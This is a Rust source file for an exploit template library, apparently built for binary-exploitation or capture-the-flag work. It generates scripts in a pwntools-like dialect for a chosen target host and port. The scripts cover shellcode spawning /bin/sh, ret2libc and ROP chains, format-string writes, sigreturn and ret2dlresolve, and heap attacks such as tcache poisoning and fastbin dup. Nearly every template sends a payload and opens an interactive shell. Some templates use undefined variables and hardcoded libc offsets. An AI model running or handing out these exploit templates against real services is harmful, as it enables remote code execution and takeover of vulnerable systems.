#![allow(dead_code)]

pub struct OneLinerLibrary;

impl OneLinerLibrary {
    pub fn list_templates() -> Vec<String> {
        vec![
            "shell".to_string(),
            "leak-libc".to_string(),
            "rop-chain".to_string(),
            "ret2libc".to_string(),
            "format-string".to_string(),
            "heap-spray".to_string(),
            "buffer-overflow".to_string(),
            "stack-pivot".to_string(),
            "sigrop".to_string(),
            "one-gadget".to_string(),
            "ret2dlresolve".to_string(),
            "house-of-force".to_string(),
            "house-of-spirit".to_string(),
            "tcache-poison".to_string(),
            "fastbin-dup".to_string(),
            "unsorted-bin-attack".to_string(),
        ]
    }

    pub fn get_template(template_name: &str, target: &str, port: u16) -> Option<String> {
        match template_name {
            "shell" => Some(Self::get_shell(target, port)),
            "leak-libc" | "leak" => Some(Self::leak_libc(target, port)),
            "rop-chain" | "rop" => Some(Self::rop_chain(target, port)),
            "ret2libc" => Some(Self::ret2libc(target, port)),
            "format-string" | "fmt" => Some(Self::fmt_string_exploit(target, port)),
            "heap-spray" => Some(Self::heap_spray(target, port)),
            "buffer-overflow" | "bof" => Some(Self::buffer_overflow(target, port)),
            "stack-pivot" | "pivot" => Some(Self::stack_pivot(target, port)),
            "sigrop" | "srop" => Some(Self::sigrop(target, port)),
            "one-gadget" | "one_gadget" => Some(Self::one_gadget(target, port)),
            "ret2dlresolve" | "dlresolve" => Some(Self::ret2dlresolve(target, port)),
            "house-of-force" | "hof" => Some(Self::house_of_force(target, port)),
            "house-of-spirit" | "hos" => Some(Self::house_of_spirit(target, port)),
            "tcache-poison" | "tcache" => Some(Self::tcache_poison(target, port)),
            "fastbin-dup" | "fastbin" => Some(Self::fastbin_dup(target, port)),
            "unsorted-bin-attack" | "unsorted" => Some(Self::unsorted_bin_attack(target, port)),
            _ => None,
        }
    }

    pub fn get_shell(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})
let payload = shellcode("x64", "execve", "/bin/sh")
send(s, payload)
interactive(s)"#, target, port)
    }

    pub fn leak_libc(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})
recv_until(s, ":")
let leak = recv(s, 8)
let leaked_addr = u64(leak)
print("Leaked address: 0x" + hex(leaked_addr))

let matches = libc_search("puts", leaked_addr)
if len(matches) > 0 {{
    let libc = matches[0]
    print("Found libc: " + libc.id)
    let libc_base = leaked_addr - libc.symbols["puts"]
    print("libc base @ 0x" + hex(libc_base))
}}"#, target, port)
    }

    pub fn rop_chain(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})
let binary = "./vuln"

let pop_rdi = rop_find(binary, "pop rdi; ret")[0].address
let ret = rop_find(binary, "ret")[0].address

let leaked_addr = u64(recv(s, 8))
let libc_base = leaked_addr - 0x809c0

let system = libc_base + 0x4f440
let binsh = libc_base + 0x1b3e9a

let payload = cyclic(72) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
send(s, payload)
interactive(s)"#, target, port)
    }

    pub fn ret2libc(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})
let binary = "./vuln"

let offset = auto_offset(binary)
print("Buffer offset: " + str(offset))

let puts_plt = find_symbol(binary, "puts", section: "plt")
let puts_got = find_symbol(binary, "puts", section: "got")
let main_addr = find_symbol(binary, "main")
let pop_rdi = rop_find(binary, "pop rdi; ret")[0].address

let payload1 = "A" * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
send(s, payload1)

let leak = u64(recv_until(s, "\n")[0..8])
print("Leaked puts @ 0x" + hex(leak))

let matches = libc_search("puts", leak)
let libc_base = leak - matches[0].symbols["puts"]
let system = libc_base + matches[0].symbols["system"]
let binsh = libc_base + matches[0].symbols["str_bin_sh"]

let payload2 = "A" * offset + p64(pop_rdi) + p64(binsh) + p64(system)
send(s, payload2)
interactive(s)"#, target, port)
    }

    pub fn fmt_string_exploit(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})
let target_addr = 0x0804a000
let target_value = 0xdeadbeef

let payload = fmtstr_payload(6, {{target_addr: target_value}}, arch: "x86")
send(s, payload)
interactive(s)"#, target, port)
    }

    pub fn heap_spray(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})
let shellcode = shellcode("x64", "execve", "/bin/sh")
let nop_sled = "\x90" * 0x1000

for i in range(1000) {{
    send(s, nop_sled + shellcode)
}}

let trigger = "TRIGGER\n"
send(s, trigger)
interactive(s)"#, target, port)
    }

    pub fn buffer_overflow(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})
let binary = "./vuln"

let offset = auto_offset(binary)
let win_addr = find_symbol(binary, "win")

let payload = cyclic(offset) + p64(win_addr)
send(s, payload)
interactive(s)"#, target, port)
    }

    pub fn stack_pivot(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})
let binary = "./vuln"

let bss_addr = find_section(binary, ".bss").address + 0x800
let pop_rsp = rop_find(binary, "pop rsp; ret")[0].address

let rop_chain = [
    pop_rdi_addr,
    binsh_addr,
    system_addr,
]

send(s, p64(bss_addr) + pack_addresses(rop_chain))

let payload = cyclic(72) + p64(pop_rsp) + p64(bss_addr)
send(s, payload)
interactive(s)"#, target, port)
    }

    pub fn sigrop(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})
let binary = "./vuln"

let syscall_ret = rop_find(binary, "syscall; ret")[0].address
let pop_rax = rop_find(binary, "pop rax; ret")[0].address

let frame = sigreturn_frame({{
    "rax": 59,
    "rdi": binsh_addr,
    "rsi": 0,
    "rdx": 0,
    "rip": syscall_ret,
}})

let payload = cyclic(72) + p64(pop_rax) + p64(15) + p64(syscall_ret) + frame
send(s, payload)
interactive(s)"#, target, port)
    }

    pub fn one_gadget(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})
let binary = "./vuln"

let leak = u64(recv(s, 8))
let libc_base = leak - 0x809c0

let one_gadget = libc_base + 0x4f3d5

let payload = cyclic(72) + p64(one_gadget)
send(s, payload)
interactive(s)"#, target, port)
    }

    pub fn ret2dlresolve(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})
let binary = "./vuln"

let plt0 = find_symbol(binary, "_PROCEDURE_LINKAGE_TABLE_")
let bss = find_section(binary, ".bss").address

let fake_reloc_offset = (bss - dynsym_addr) / 0x18

let payload = cyclic(72) + p64(plt0) + p64(fake_reloc_offset) + fake_structures
send(s, payload)
interactive(s)"#, target, port)
    }

    pub fn house_of_force(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})

send(s, "1\n")
send(s, str(0x10) + "\n")
send(s, "A" * 0x10 + p64(0xffffffffffffffff) + "\n")

let target_addr = 0x602060
let top_chunk_addr = heap_base + 0x20
let evil_size = target_addr - top_chunk_addr - 0x20

send(s, "1\n")
send(s, str(evil_size) + "\n")

send(s, "1\n")
send(s, "24\n")
send(s, p64(target_got) + "\n")

interactive(s)"#, target, port)
    }

    pub fn house_of_spirit(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})

let fake_chunk = p64(0) + p64(0x71) + "A" * 0x60 + p64(0x70)
send(s, fake_chunk)

send(s, "free\n")

send(s, "malloc\n")
send(s, p64(target_addr) + "\n")

interactive(s)"#, target, port)
    }

    pub fn tcache_poison(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})

for i in range(7) {{
    send(s, "alloc\n64\n")
}}

for i in range(7) {{
    send(s, "free\n" + str(i) + "\n")
}}

send(s, "edit\n6\n" + p64(target_addr) + "\n")

send(s, "alloc\n64\n")
send(s, "alloc\n64\n")
send(s, "edit\n8\n" + payload + "\n")

interactive(s)"#, target, port)
    }

    pub fn fastbin_dup(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})

send(s, "alloc\n64\nA")
send(s, "alloc\n64\nB")
send(s, "alloc\n64\nC")

send(s, "free\n0")
send(s, "free\n1")
send(s, "free\n0")

send(s, "alloc\n64\n" + p64(target_addr))
send(s, "alloc\n64\nX")
send(s, "alloc\n64\nY")
send(s, "alloc\n64\n" + payload)

interactive(s)"#, target, port)
    }

    pub fn unsorted_bin_attack(target: &str, port: u16) -> String {
        format!(r#"let s = connect("{}", {})

send(s, "alloc\n1024\nA")
send(s, "alloc\n1024\nB")

send(s, "free\n0")

send(s, "edit\n0\n" + "A" * 8 + p64(target_addr - 0x10))

send(s, "alloc\n1024\nC")

interactive(s)"#, target, port)
    }
}
